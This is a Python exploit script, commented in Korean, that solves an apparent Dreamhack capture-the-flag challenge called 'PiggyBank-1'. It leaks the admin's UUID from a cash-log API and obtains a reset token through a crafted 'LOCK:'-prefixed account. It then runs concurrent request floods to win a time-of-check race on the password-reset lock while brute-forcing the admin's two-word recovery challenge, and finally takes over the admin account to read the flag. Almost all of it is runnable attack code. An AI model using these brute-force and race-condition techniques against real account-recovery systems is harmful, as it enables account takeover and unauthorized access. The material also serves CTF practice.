import asyncio
import aiohttp
import requests
import re
import itertools
import time
import uuid
import random

TARGET_URL = "http://host8.dreamhack.games:8266"
SECURE_CODE_LIST = [
    "refuse", "sector", "dentist", "release", "tenant", "lunch", "code", "partner", 
    "chicken", "ribbon", "apple", "cargo", "damage", "enjoy", "index", "theori", 
    "dreamhack", "across", "idea", "noble"
]

def get_admin_uuid():
    print("\n[*] 1단계: 임시 계정 생성 및 Cash Log 브루트포싱")
    s = requests.Session()
    uid = f"h{uuid.uuid4().hex[:4]}"
    
    print(f"  [>] 임시 유저 생성 중... (ID: {uid})")
    res_up = s.post(f"{TARGET_URL}/user/signup", data={
        "username": uid, "password": "Password123!", "email": f"{uid}@a.com",
        "realName": "Hacker", "regNumber": "990101000000000", "memo": "m", "countryCode": "82"
    })
    
    if "alert alert-danger" in res_up.text:
        err = re.search(r'class="alert alert-danger"[^>]*>([^<]+)<', res_up.text)
        print(f"  [!] 회원가입 에러: {err.group(1).strip() if err else '알 수 없음'}")
        return None

    res_in = s.post(f"{TARGET_URL}/user/signin", data={"username": uid, "password": "Password123!"})
    if "alert alert-danger" in res_in.text:
        print("  [!] 로그인 실패!")
        return None
    
    test_categories = ["ALL", "RECEIVE", "SEND", "reward", "transfer", "commission", "REWARD", "TRANSFER", ""]
    for c1 in test_categories:
        for c2 in test_categories:
            res_log = s.post(f"{TARGET_URL}/api/cash/krw/log", data={"category": c1, "category2": c2})
            if res_log.status_code == 200:
                try:
                    logs = res_log.json()
                    if logs and len(logs) > 0:
                        for log in logs:
                            sender_id = log.get("sender_id") or log.get("senderId")
                            if sender_id and sender_id != "system":
                                print(f"  [🎉] Admin UUID 획득: {sender_id}")
                                return sender_id
                except:
                    pass
    
    print("  [!] Cash Log에서 Admin UUID를 찾지 못했습니다.")
    return None

def get_master_unlock_token(admin_uuid):
    s = requests.Session()
    manip_id = f"LOCK:{admin_uuid}" 
    manip_pw = "MasterKey123!"
    
    print(f"\n[*] 2단계: 트로이 목마 계정 생성 (ID: {manip_id})")
    res_up = s.post(f"{TARGET_URL}/user/signup", data={
        "username": manip_id, "password": manip_pw, "email": "lock@hacker.com",
        "realName": "Lock", "regNumber": "990101000000000", "memo": "m", "countryCode": "82"
    }, allow_redirects=True)
    
    clean_text = re.sub(r'<[^>]+>', ' ', res_up.text)
    code_match = re.search(r'([a-z]+(?:\s*,\s*[a-z]+){19})', clean_text.lower())
    
    if not code_match:
        trojan_secure_code = input("  [!] 복구 코드 파싱 실패. 20개 코드를 쉼표로 구분해 입력하세요: ")
    else:
        trojan_secure_code = code_match.group(1)
        print("  [+] 복구 코드 파싱 완료.")
        
    codes = [c.strip() for c in trojan_secure_code.split(",")]
    
    s_anon = requests.Session()
    res_reset = s_anon.post(f"{TARGET_URL}/user/reset/", data={"username": manip_id}, allow_redirects=True)
    manip_chal_token = re.search(r'name="challengeToken"\s+value="([^"]+)"', res_reset.text).group(1)
    
    res_chall = s_anon.get(f"{TARGET_URL}/user/reset/challenge?challenge_token={manip_chal_token}")
    visible_text = re.sub(r'<[^>]+>', ' ', re.sub(r'<style.*?</style>|<script.*?</script>', '', res_chall.text, flags=re.DOTALL|re.IGNORECASE))
    
    print("\n  [?] 트로이 목마 챌린지 화면")
    print("  " + "-"*50)
    print(f"  {re.sub(r'\s+', ' ', visible_text).strip()[:800]}...") 
    print("  " + "-"*50)
    
    idx1 = int(input("  첫 번째 요구 단어 번호: "))
    idx2 = int(input("  두 번째 요구 단어 번호: "))
        
    ans1, ans2 = codes[idx1-1], codes[idx2-1]
    res_solve = s_anon.post(f"{TARGET_URL}/user/reset/challenge", data={"answers": f"{ans1},{ans2}", "challengeToken": manip_chal_token}, allow_redirects=True)
    pass_token_match = re.search(r'name="passResetToken"\s+value="([^"]+)"', res_solve.text)
    
    if not pass_token_match:
        print("  [!] 마스터 토큰 발급 실패.")
        return None
        
    master_token = pass_token_match.group(1)
    print(f"  [🎉] 마스터 언락 토큰 획득: {master_token}")
    return master_token

async def unlock_worker(session, master_token, worker_id):
    url = f"{TARGET_URL}/user/reset/password"
    data = {"firstPassword": "Pwned123!", "secondPassword": "Pwned123!", "passResetToken": master_token}
    while True:
        try:
            async with session.post(url, data=data) as resp:
                await resp.read()
            await asyncio.sleep(0.01)
        except asyncio.CancelledError:
            break
        except Exception:
            pass

async def attack_admin(session, challenge_token, answers):
    try:
        async with session.post(
            f"{TARGET_URL}/user/reset/challenge", 
            data={"answers": answers, "challengeToken": challenge_token}, 
            allow_redirects=False, 
            timeout=aiohttp.ClientTimeout(total=20)
        ) as resp:
            loc = resp.headers.get("Location", "")
            if resp.status == 302 and "pass_reset_token=" in loc:
                token = loc.split("pass_reset_token=")[1].split("&")[0]
                return token, answers
    except Exception:
        pass
    return None

async def main_async():
    print("="*60)
    print("🐖 PiggyBank-1 100% Deterministic TOCTOU Exploit 🐖")
    print("="*60)

    admin_uuid = get_admin_uuid()
    if not admin_uuid: return

    master_token = get_master_unlock_token(admin_uuid)
    if not master_token: return

    print("\n[*] 3단계: Admin 비밀번호 초기화(TOCTOU) 공격 준비")
    s_anon = requests.Session()
    reset_req = s_anon.post(f"{TARGET_URL}/user/reset/", data={"username": "admin"}, allow_redirects=True)
    admin_chal_token = re.search(r'name="challengeToken"\s+value="([^"]+)"', reset_req.text).group(1)
    print(f"  [DEBUG] Admin Challenge Token: {admin_chal_token}")
    s_anon.get(f"{TARGET_URL}/user/reset/challenge?challenge_token={admin_chal_token}")

    combinations = list(itertools.permutations(SECURE_CODE_LIST, 2))
    all_payloads = [f"{c[0]},{c[1]}" for c in combinations]
    random.shuffle(all_payloads)
    
    # 🌟 CPU 마비를 피하면서도 8배치 안에 끝내는 완벽한 숫자 (48개)
    BATCH_SIZE = 48
    
    print(f"\n[*] 4단계: 다중 락 분쇄기(Multi-Shredder) 가동 & {BATCH_SIZE}개 단위 폭격 시작!")
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        # 3개의 락 분쇄기를 비동기로 돌려 스핀락을 원천 차단합니다.
        hammer_tasks = [asyncio.create_task(unlock_worker(session, master_token, i)) for i in range(3)]
        await asyncio.sleep(1)
        
        start_time = time.time()
        found = False
        
        for i in range(0, len(all_payloads), BATCH_SIZE):
            batch = all_payloads[i:i+BATCH_SIZE]
            batch_num = (i//BATCH_SIZE) + 1
            print(f"\n  [🚀] Batch #{batch_num} 발사! ({len(batch)}개 조합 동시 검증 중...)")
            
            tasks = [asyncio.create_task(attack_admin(session, admin_chal_token, payload)) for payload in batch]
            results = await asyncio.gather(*tasks)
            
            for result in results:
                if result:
                    for hammer in hammer_tasks: hammer.cancel()
                    admin_pass_token, ans = result
                    print(f"\n[🔥 SUCCESS] 정답 발견! 조합: {ans} (소요시간: {time.time()-start_time:.2f}초)")
                    
                    new_pw = "pwned_admin_123!"
                    print(f"  [>] Admin 비밀번호를 '{new_pw}'로 변경 후 로그인 시도...")
                    s_anon.post(f"{TARGET_URL}/user/reset/password", data={"firstPassword": new_pw, "secondPassword": new_pw, "passResetToken": admin_pass_token})
                    s_anon.post(f"{TARGET_URL}/user/signin", data={"username": "admin", "password": new_pw})
                    
                    mypage_res = s_anon.post(f"{TARGET_URL}/api/user/mypage")
                    flag = mypage_res.json().get("memo")
                    
                    print("\n" + "="*60)
                    print(f"🎉 FLAG FOUND: {flag}")
                    print("="*60)
                    found = True
                    break
            
            if found:
                break
                
            print(f"  [!] Batch #{batch_num} 완료. 8.5초간 대기 중 (안전한 DB 커넥션 반환 및 수면 보장)...")
            await asyncio.sleep(8.5)

        if not found:
            for hammer in hammer_tasks: hammer.cancel()
            print("\n[-] 실패했습니다. 서버 상태를 다시 한 번 확인해 주세요.")

if __name__ == "__main__":
    asyncio.run(main_async())